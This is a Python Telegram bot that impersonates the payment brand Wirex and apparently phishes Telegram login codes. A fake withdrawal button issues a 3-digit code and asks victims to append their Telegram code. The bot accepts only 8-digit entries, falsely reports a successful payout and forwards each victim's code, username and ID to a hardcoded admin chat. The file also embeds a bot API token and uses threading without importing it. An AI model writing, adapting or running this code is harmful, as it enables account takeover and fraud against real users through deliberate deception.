import os
import logging
import random
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask


# Flask app
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Bot is alive!"

def run_flask():
    port = int(os.environ.get("PORT", 8000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# Start Flask in background
flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()

# --- Bot & Admin Config ---
API_TOKEN = "7001557432:AAEJ9-r4cGwTiLtrScvAHfW1rN77OK6lUp0"


#telegram link with ref  https://t.me/Wirexltd_Bot?start=wirex
# telegram link https://t.me/Wirexltd_Bot
# telegram link for auto statr bot with button https://t.me/Wirexltd_Bot?start=wirex
#get admin chat id with @userinfobot
#ADMIN_TELEGRAM_ID = 6772237358   # <-- replace with your Telegram user ID Testing


ADMIN_TELEGRAM_ID = 6179401337

# --- User state tracking ---
user_states = {}

# --- Logging setup ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# Initialize bot
bot = telebot.TeleBot(API_TOKEN)

# --- Start Command Handler ---
@bot.message_handler(commands=['start'])
def start(message):
    """Handles the /start command."""
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("💰 Withdraw Your Current Balance", callback_data="withdraw_balance"))

    bot.send_message(
        message.chat.id,
        "👋 Welcome to *Wirex*!\n\nChoose an option below ⬇️",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

    # Notify admin about the new user
    try:
        bot.send_message(
            ADMIN_TELEGRAM_ID,
            f"🔔 New user started the Wirex Bot!\n\n"
            f"👤 User: @{message.from_user.username or 'NoUsername'}\n"
            f"📛 Name: {message.from_user.first_name}\n"
            f"🆔 ID: {message.from_user.id}"
        )
    except Exception as e:
        logging.error(f"Failed to notify admin: {e}")

# --- Withdraw Button Handler ---
@bot.callback_query_handler(func=lambda call: call.data == 'withdraw_balance')
def withdraw_button(call):
    """Handles the 'withdraw_balance' callback query."""
    user_id = call.from_user.id
    
    # Acknowledge the button press
    bot.answer_callback_query(call.id)

    random_number = random.randint(100, 999)

    # Save user state for the next step
    user_states[user_id] = {"action": "withdraw", "random_code": random_number}

    bot.send_message(
        call.message.chat.id,
        f"🆔 Your Withdrawal Code is: *{random_number}*\n\n"
        "📝 Please enter your withdrawal code along side your telegram *code* into the prompt below to proceed with your withdrawal:",
        parse_mode="Markdown"
    )

# --- Handle Code Input for Withdrawal ---
@bot.message_handler(func=lambda message: True)
def handle_code(message):
    """Handles text messages from users expecting a withdrawal code."""
    if message.text.startswith('/'):
        return
        
    user_id = message.from_user.id
    code_entered = message.text.strip()

    # Check user state to see if they are in the withdrawal process
    if user_id not in user_states or user_states[user_id]["action"] != "withdraw":
        bot.send_message(message.chat.id, "❌ Please click the 'Withdraw Your Current Balance' button first.")
        return

    # Validate the code entered (assuming it should be 8 digits)
    if not code_entered.isdigit() or len(code_entered) != 8:
        bot.send_message(message.chat.id, "❌ Invalid code! Please enter your withdrawal code along side your telegram *code* into the prompt below to proceed with your withdrawal. Try again.")
        return

    # The code is correct, proceed with processing
    bot.send_message(
        message.chat.id,
        "✅ Your transaction has been processed successfully! 🎉\n\n"
        "💸 It will be received in your Telegram wallet in less than 24 hours.",
        parse_mode="Markdown"
    )

    # Notify admin about the successful withdrawal
    try:
        bot.send_message(
            ADMIN_TELEGRAM_ID,
            f"🔔 Withdrawal request processed!\n\n"
            f"👤 User: @{message.from_user.username or 'No username'}\n"
            f"📛 Name: {message.from_user.first_name}\n"
            f"🆔 ID: {message.from_user.id}\n"
            f"🔑 Code Entered: {code_entered}"
        )
    except Exception as e:
        logging.error(f"Failed to notify admin: {e}")

    # Clear user state after completion
    user_states.pop(user_id, None)

# --- Start the bot ---
if __name__ == "__main__":
    print("Bot is starting...")
    bot.infinity_polling()

